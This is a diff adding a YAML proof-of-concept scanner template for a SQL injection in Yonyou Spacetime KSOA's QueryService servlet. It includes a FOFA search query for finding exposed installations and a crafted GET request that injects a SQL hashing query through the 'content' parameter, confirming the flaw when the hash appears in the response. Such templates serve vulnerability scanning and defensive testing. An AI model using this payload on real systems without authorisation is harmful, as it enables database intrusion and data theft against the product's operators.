@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-ksoa-com-sksoft-bill-queryservice-sqli
+info:
+  name: 用友时空KSOA com.sksoft.bill.QueryService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+variables:
+  num: random_int(10000,99999)
+  code: md5(num)
+requests:
+- method: GET
+  path: /servlet/com.sksoft.bill.QueryService?service=query&content=select%20sys.fn_varbintohexstr(hashbytes('md5','{{.num}}'))
+  expression: 'status_code == 200 &&
+
+    contains(body,code) &&
+
+    contains(headers,"text/xml")
+
+    '
+transport: http
